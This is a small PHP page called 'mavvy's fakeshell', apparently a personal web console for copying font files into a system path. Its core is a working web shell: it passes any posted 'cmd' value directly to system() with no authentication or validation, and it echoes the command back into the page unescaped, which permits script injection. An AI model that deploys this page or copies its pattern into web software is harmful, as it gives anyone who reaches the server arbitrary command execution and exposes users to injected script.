<?php

$dir = @ dir("../guifont/");

while (($file = $dir->read()) !== false)
  {
  if ($file <> ".") if ($file <> "..")
  $menu[$file] = "cp ./guifont/$file /usr/local/bin/Resource/cwheib.ttf";
	
  }

$dir->close();
@exec("uname -a", $uname);
?>

<html>

<head>
<title>mavvy's fakeshell</title>
<link rel="stylesheet" type="text/css" href="fakeshell.css">
</head>

<body>

<table border=0 cellspacing=0 cellpadding=0>
<form name=shell method=post action=<? echo $PHP_SELF; ?>>
	<tr>
		<td><p>[ <? $counter = count($menu); foreach ($menu as $k => $v) { echo "<span onclick=\"document.shell.cmd.value='".$v."';document.shell.cmd.focus();\">".$k."</span>"; $counter--; if ($counter) { print " | ";} } ?> ]</p></td>
	</tr>
	<tr>
		<td><pre># <input type=text name=cmd size=110 value="<? if(isset($_POST[cmd])){echo $cmd;} ?>"><script> document.shell.cmd.focus(); </script></pre></td>
	</tr>
	<tr>
		<td><pre><? if (!empty($_POST[cmd])) system($_POST[cmd]); ?></pre></td>
	</tr>

</form>

</table>

</body>

</html>
